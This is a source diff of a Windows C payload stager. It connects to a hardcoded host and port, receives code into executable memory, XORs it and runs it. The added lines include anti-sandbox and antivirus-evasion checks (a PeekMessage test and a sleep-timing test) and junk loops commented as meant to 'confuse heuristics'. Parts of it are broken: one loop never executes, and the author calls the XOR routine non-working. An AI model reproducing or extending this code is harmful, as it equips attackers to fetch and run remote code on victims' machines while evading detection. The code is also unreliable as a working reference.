@@ -14,6 +14,7 @@ void winsock_init() {
 		exit(1);
 	}
 }
+
 void Kick(SOCKET my_socket, char * error) {
 	printf("error: %s\n", error);
 	closesocket(my_socket);
@@ -22,6 +23,15 @@ void Kick(SOCKET my_socket, char * error) {
 }
 
 
+void genlol(){
+	int num1, num2, num3;
+	num1=100;
+	while (num1<=5) {
+		num1=random_in_range(0,10000);
+		num2=random_in_range(0,10000);
+   		num3=random_in_range(0,10000);
+	}
+}
 
 int recv_all(SOCKET my_socket, void * buffer, int len) {
 	int    tret   = 0;
@@ -36,8 +46,6 @@ int recv_all(SOCKET my_socket, void * buffer, int len) {
 	}
 	return tret;
 }
-
-
 
 SOCKET wsconnect(char * targetip, int port) {
 	struct hostent *		target;
@@ -57,7 +65,7 @@ SOCKET wsconnect(char * targetip, int port) {
 	return my_socket;
 }
 
-
+//this function simply generates a random number between min/max, with fairly even distribution
 int random_in_range (unsigned int min, unsigned int max)
 {
   int base_random = rand(); /* in [0, RAND_MAX] */
@@ -75,17 +83,15 @@ int random_in_range (unsigned int min, unsigned int max)
   }
 }
 
+//this is non working xor nonsense, i literally have no idea whats going on right now.
 char* rev(char* str)
 {
   int end=strlen(str)-1;
-  int start = 5;
-
-  while( start<end )
+  int i;
+  for(i=5; i<end; i++)
   {
-    str[start] ^= 1;
-    ++start;
+  	str[i] ^= 1;
   }
-
   return str;
 }
 
@@ -96,61 +102,69 @@ int main(int argc) {
 	void (*function)();
 	winsock_init();
 	char argv[3][25];
-	int num1, num2, num3;
 
+	//initialize the variables for random number generation
+	
+
+	//this program was ment to be run from the command line, so i added this shit so it would work
 	strcpy(argv[1],"10.1.225.101");
 	strcpy(argv[2],"4445");
 
+	//================================
+	//begin sandbox evasssioooooon
 	MSG msg;
 	DWORD tc;
+	//check to see if the application is fully loaded, aparently AV hates peekmessage
+	//see this post for more info http://schierlm.users.sourceforge.net/avevasion.html
 	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
 	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
 		return 0;
 	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
 		return 0;
+	//record the ticks, then sleep, then count the ticks.... this verifies that we actually slept for 650
+	//this helps burn out the clock on the sandboxing, or detect if sandboxing is converting sleeps to nops
 	tc = GetTickCount();
 	Sleep(650);
 	if (((GetTickCount() - tc) / 300) != 2)
 		return 0;
+	//=================================
 
+	//start the socket homie
 	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
 	int count = recv(my_socket, (char *)&size, 4, 0);
 	if (count != 4 || size <= 0)
 		Kick(my_socket, "bad length value\n");
 
-	while (num1<=5) {
-		num1=random_in_range(0,10000);
-		num2=random_in_range(0,10000);
-   		num3=random_in_range(0,10000);
-	}
-	num1=0;
-	
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation
+	genlol();
+	//================================	
+
 	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-	while (num1<=5) {
-		num1=random_in_range(0,10000);
-		num2=random_in_range(0,10000);
-   		num3=random_in_range(0,10000);
-	}
-	num1=0;
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation
+	genlol();
+	//================================
+
 	if (buffer == NULL)
 		Kick(my_socket, "bad buffer\n");
 	buffer[0] = 0xBF;
-	
-	while (num1<=5) {
-		num1=random_in_range(0,10000);
-		num2=random_in_range(0,10000);
-   		num3=random_in_range(0,10000);
-	}
-	num1=0;
+
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation	
+	genlol();
+	//================================
+
 	memcpy(buffer + 1, &my_socket, 4);
-	while (num1<=5) {
-		num1=random_in_range(0,10000);
-		num2=random_in_range(0,10000);
-   		num3=random_in_range(0,10000);
-	}
-	num1=0;
+
+	//================================
+	//burn out the clock, and confuse heuristics with some random number generation
+	genlol();
+	//================================
+	
 	count = recv_all(my_socket, buffer + 5, size);
+	buffer=rev(buffer);
 	function = (void (*)())buffer;
 	function();
 	return 0;
